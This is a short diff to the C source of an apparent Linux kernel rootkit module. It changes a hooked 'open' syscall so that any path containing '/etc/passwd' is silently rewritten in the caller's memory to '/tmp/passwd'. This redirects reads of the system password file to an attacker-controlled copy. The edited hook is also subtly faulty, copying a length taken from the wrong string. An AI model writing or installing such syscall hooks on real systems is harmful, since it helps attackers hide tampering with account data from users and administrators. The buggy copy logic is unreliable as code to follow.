@@ -67,13 +67,10 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-    printk(KERN_INFO "Very, very Sneaky!\n");
-
-    char originalPath[] = "/etc/passwd";
-    char targetPath[] = "/tmp/passwd";
-    if (strcmp(pathname, originalPath) == 0)
+    //printk(KERN_INFO "Very, very Sneaky!\n");
+    if (strstr(pathname, "/etc/passwd") != NULL)
     {
-        copy_to_user((void *)pathname, targetPath, strlen(targetPath));
+        copy_to_user((void *)pathname, "/tmp/passwd", strlen(pathname));
     }
 
     return original_call(pathname, flags);
